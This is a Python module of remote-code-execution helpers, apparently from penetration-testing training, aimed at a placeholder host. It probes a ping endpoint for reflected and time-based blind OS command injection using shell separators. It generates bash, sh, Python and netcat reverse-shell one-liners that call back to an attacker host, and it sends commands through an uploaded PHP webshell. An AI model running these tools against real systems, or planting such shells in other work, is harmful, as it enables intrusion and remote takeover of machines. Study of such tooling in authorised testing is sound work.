#!/usr/bin/env python3
"""Remote Code Execution helpers: OS command injection (direct and blind
time-based), a reverse-shell one-liner generator, and a minimal upload-to-RCE
webshell sender."""

import time
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
SESSION = requests.Session()

COMMAND_SEPARATORS = ["; {cmd}", "| {cmd}", "& {cmd}", "`{cmd}`", "$({cmd})", "%0a{cmd}"]


def test_command_injection(param: str, marker_cmd: str = "echo OSWE$((1+1))OSWE") -> list[str]:
    """Try each separator with a self-identifying echo and report which ones
    reflect the computed marker (OSWE2OSWE) back in the response."""
    hits = []
    for sep in COMMAND_SEPARATORS:
        payload = sep.format(cmd=marker_cmd)
        r = SESSION.get(f"{BASE_URL}/ping", params={param: f"127.0.0.1{payload}"},
                        verify=False, timeout=10)
        if "OSWE2OSWE" in r.text:
            print(f"[+] Command injection via {sep!r}")
            hits.append(sep)
    if not hits:
        print("[-] No reflected command injection; try the blind check")
    return hits


def test_command_injection_blind(param: str, delay: int = 5) -> str | None:
    """Blind OS command injection: inject a sleep and measure the delay."""
    for sep in COMMAND_SEPARATORS:
        payload = sep.format(cmd=f"sleep {delay}")
        start = time.time()
        SESSION.get(f"{BASE_URL}/ping", params={param: f"127.0.0.1{payload}"},
                    verify=False, timeout=delay + 10)
        if time.time() - start >= delay:
            print(f"[+] Blind command injection via {sep!r}")
            return sep
    print("[-] No blind command injection detected")
    return None


def reverse_shell_oneliner(lhost: str, lport: int, kind: str = "bash") -> str:
    """Generate a reverse-shell one-liner. Start a listener first: nc -lvnp <lport>."""
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "sh": f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
    }
    return shells[kind]


def send_webshell_command(webshell_url: str, cmd: str, param: str = "c") -> str:
    """Run a command through an already-uploaded webshell
    (e.g. <?php system($_GET['c']); ?>)."""
    r = SESSION.get(webshell_url, params={param: cmd}, verify=False, timeout=10)
    print(r.text[:500])
    return r.text


if __name__ == "__main__":
    pass
